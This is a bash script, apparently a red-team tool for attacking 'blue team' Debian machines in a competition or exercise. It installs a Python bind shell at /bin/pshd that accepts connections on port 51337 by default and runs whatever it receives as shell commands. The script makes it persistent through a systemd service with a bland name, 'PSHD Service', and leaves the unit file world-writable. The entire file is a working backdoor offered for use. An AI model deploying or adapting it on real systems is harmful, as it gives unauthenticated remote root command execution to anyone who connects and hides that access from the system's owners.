#! /bin/bash

# Name: Python BIND Shell Backdoor
# Notes: 
# - Script stored in /bin/pshd
# - systemd service configured to run the script (pshd.service)
# - Usage: ./blue_python_bind_shell.sh [port]
# - Default port is 51337
# Valid Targets: Blue team debian based images

PORT="51337"
if [[ -n "$1" ]]
then
PORT=$1
fi

echo "Creating BIND shell on port $PORT"

# Python Bind Shell
# Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md#python
SCRIPT="#! /usr/bin/env python3
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind((\"0.0.0.0\", $PORT));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())"

# Place script at /bin/pshd and set permissions
echo "Creating script..."
echo "$SCRIPT" | sudo tee /bin/pshd > /dev/null
sudo chown root /bin/pshd
sudo chmod 700 /bin/pshd

# Create Systemd Service to execute script
SERVICE="[Unit]
Description=PSHD Service
[Service]
ExecStart=/usr/bin/python3 /bin/pshd
Type=simple
Restart=always
[Install]
WantedBy=multi-user.target"

# Create service file
echo "Creating service..."
echo "$SERVICE" | sudo tee /etc/systemd/system/pshd.service > /dev/null
sudo chown root /etc/systemd/system/pshd.service
sudo chmod 777 /etc/systemd/system/pshd.service

# Enable service
echo "Enabling service..."
sudo systemctl enable pshd.service
sudo systemctl start pshd.service

echo "Done creating BIND shell."
